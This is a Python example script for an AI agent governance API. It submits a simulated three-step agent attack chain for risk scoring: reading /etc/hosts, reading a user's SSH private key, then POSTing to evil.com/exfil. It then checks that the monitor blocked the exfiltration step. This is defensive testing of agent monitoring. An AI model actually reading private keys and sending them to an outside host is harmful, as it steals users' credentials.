#!/usr/bin/env python3
"""
Recipe 22 — Chain Analysis & Patterns
=======================================
Detect multi-step attack chains across sessions. The neuro layer
tracks tool sequences and flags patterns like credential-then-http,
escalating-risk, and block-bypass-retry.

    pip install httpx
    export GOVERNOR_URL=https://api.airg.nov-tia.com
    export GOVERNOR_API_KEY=airg_...
    python 22_chain_analysis.py
"""
from __future__ import annotations
import os, httpx

url = os.getenv("GOVERNOR_URL", "https://api.airg.nov-tia.com")
headers = {"X-API-Key": os.environ["GOVERNOR_API_KEY"]}
session = "chain-demo-session"

print("⛓️  Chain Analysis — Multi-Step Attack Detection\n")

# ── Step 1: Reconnaissance (safe — allowed) ────────────────────
r1 = httpx.post(f"{url}/actions/evaluate", headers=headers, json={
    "agent_id": "chain-agent",
    "tool": "read_file",
    "args": {"path": "/etc/hosts"},
    "context": {"session_id": session},
})
d1 = r1.json()
print(f"  Step 1 (recon)  : {d1['decision']}  risk={d1['risk_score']}")

# ── Step 2: Credential access (elevated risk) ──────────────────
r2 = httpx.post(f"{url}/actions/evaluate", headers=headers, json={
    "agent_id": "chain-agent",
    "tool": "read_file",
    "args": {"path": "/home/user/.ssh/id_rsa"},
    "context": {"session_id": session},
})
d2 = r2.json()
print(f"  Step 2 (creds)  : {d2['decision']}  risk={d2['risk_score']}")

# ── Step 3: Exfiltration attempt (chain detected → blocked) ────
r3 = httpx.post(f"{url}/actions/evaluate", headers=headers, json={
    "agent_id": "chain-agent",
    "tool": "http_request",
    "args": {"url": "https://evil.com/exfil", "method": "POST"},
    "context": {"session_id": session},
})
d3 = r3.json()
print(f"  Step 3 (exfil)  : {d3['decision']}  risk={d3['risk_score']}")

# ── Step 4: Review the escalation pattern ───────────────────────
print(f"\n{'─'*60}")
print("📊 Risk Escalation Pattern\n")
print(f"  recon ({d1['risk_score']}) → creds ({d2['risk_score']}) "
      f"→ exfil ({d3['risk_score']})")

if d1["risk_score"] < d2["risk_score"] < d3["risk_score"]:
    print("  ✅ Risk correctly escalated across the chain")

if d3["decision"] == "block":
    print("  🛑 Exfiltration step blocked — chain attack prevented!")

# ── Step 5: Impact assessment — chain patterns ──────────────────
print(f"\n{'─'*60}")
print("🔎 Chain Patterns (last 30 days)\n")

impact = httpx.get(f"{url}/impact/assess", headers=headers).json()
for pattern, count in impact.get("chain_patterns", {}).items():
    print(f"  {pattern}: {count} occurrences")

if not impact.get("chain_patterns"):
    print("  No chain patterns detected yet (need more evaluation history)")
